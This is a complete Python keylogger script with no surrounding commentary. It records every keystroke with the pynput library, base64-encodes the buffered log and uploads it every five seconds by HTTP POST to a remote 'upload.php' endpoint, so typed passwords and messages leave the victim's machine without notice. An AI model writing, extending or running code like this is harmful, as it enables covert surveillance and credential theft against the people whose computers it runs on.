import requests
from pynput import keyboard
import threading
import time
import base64

# Configuration
server_url = "webserver/upload.php"
log_interval = 5

log_data = []
is_running = True

def send_logs():
    global log_data
    while is_running:
        if log_data:
            data = '\n'.join(log_data)
            try:
                response = requests.post(server_url, data=base64.b64encode(data.encode('utf-8')).decode('utf-8'), headers={"X-FILENAME": "logs.txt"})
                print(f"Logs sent! Server responded with status code: {response.status_code}")
                log_data.clear()
            except Exception as e:
                print(f"Failed to send logs: {e}")
        time.sleep(log_interval)

def on_press(key):
    global log_data
    try:
        log_data.append(f'{key.char} pressed')
    except AttributeError:
        log_data.append(f'{key} pressed')  # For special keys

def on_release(key):
    if key == keyboard.Key.esc:
        return False

thread = threading.Thread(target=send_logs)
thread.start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogger stopped.")
is_running = False
